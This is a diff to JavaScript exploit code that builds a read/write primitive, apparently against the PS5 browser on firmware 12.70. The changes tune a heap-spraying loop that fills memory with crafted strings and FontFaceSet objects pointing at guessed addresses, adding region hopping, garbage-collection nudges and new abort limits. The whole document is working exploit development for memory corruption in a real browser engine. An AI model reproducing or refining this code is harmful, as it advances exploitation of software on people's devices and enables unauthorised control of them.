@@ -195,32 +195,49 @@ async function buildReadWriteChain() {
         return s;
     }
 
-    // Scan a wide address range to find font objects on 12.70
-    // Start from 0x200000000 and scan upward in steps of NPAGES*PAGE_SIZE
-    // Made ASYNC so the PS5 browser doesn't freeze with "page not responding"
+    // Scan for font objects on 12.70
+    // Memory-efficient: clean up between rounds so PS5 doesn't OOM
+    // Region-hopping: try each 256MB region briefly, then skip ahead
     var guf = 0x200000000;
     var ite = true;
     var matches = 0;
     var round = 0;
     var guessed_font = null;
     var guessed_addr = null;
+    var region_rounds = 0;
+    var ROUNDS_PER_REGION = 150;
+    var REGION_HOP = 0x8000000; // 128MB hops
 
-    window.ffses = {};
+    // Keep only current round's data
+    var cur_ffs = null;
+    var cur_strings = [];
 
-    log("[*] Scanning for font objects (async)...");
+    log("[*] Scanning for font objects (async, memory-safe)...");
 
     do {
+        // Clean up previous round
+        if (cur_ffs) cur_ffs = null;
+        if (cur_strings.length > 0) cur_strings = [];
+
+        // Encourage GC every 10 rounds
+        if (round % 10 === 0) {
+            for (let gc = 0; gc < 20; gc++) { let tmp = new ArrayBuffer(65536); tmp = null; }
+        }
+
         var p_s = ptrToString(NPAGES + 2);
         for (var i = 0; i < NPAGES; i++)
             p_s += ptrToString(guf + i * PAGE_SIZE);
         p_s += ptrToString(INVALID_POINTER);
 
-        for (var i = 0; i < 256; i++)
-            mkString(HASHMAP_BUCKET, p_s);
+        for (var i = 0; i < 256; i++) {
+            var ts = mkString(HASHMAP_BUCKET, p_s);
+            cur_strings.push(ts);
+        }
 
-        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);
+        cur_ffs = new FontFaceSet(bad_fonts);
 
         var badstr1 = mkString(HASHMAP_BUCKET, p_s);
+        cur_strings.push(badstr1);
 
         guessed_font = null;
         guessed_addr = null;
@@ -244,19 +261,33 @@ async function buildReadWriteChain() {
             }
         }
 
+        // Reset font families so old FontFaceSet can be GC'd cleanly
+        for (var i = 0; i < SPRAY_FONTS; i++)
+            bad_fonts[i].family = "font1";
+
+        round++;
+        region_rounds++;
+
         if ((ite = !ite))
             guf += NPAGES * PAGE_SIZE;
 
-        // Yield to browser every 5 rounds so PS5 doesn't show "not responding"
-        if (round % 5 === 0) {
+        // If we've exhausted this region, hop to the next one
+        if (region_rounds >= ROUNDS_PER_REGION && guessed_addr === null) {
+            region_rounds = 0;
+            guf += REGION_HOP;
+            log("[*] Hopping to region " + hex(guf));
+        }
+
+        // Yield to browser every 3 rounds
+        if (round % 3 === 0) {
             setStatus("Scanning... round " + round + " @ " + hex(guf));
             await sleep(0);
         }
 
-        // Safety: abort after too many rounds
-        if (round > 5000) {
-            log("[-] Exceeded max scan rounds, aborting.");
-            setStatus("FAILED — scan exhausted");
+        // Safety: abort after scanning ~8GB of address space
+        if (guf > 0x400000000) {
+            log("[-] Scanned full range, not found.");
+            setStatus("FAILED — address not found");
             return;
         }
 
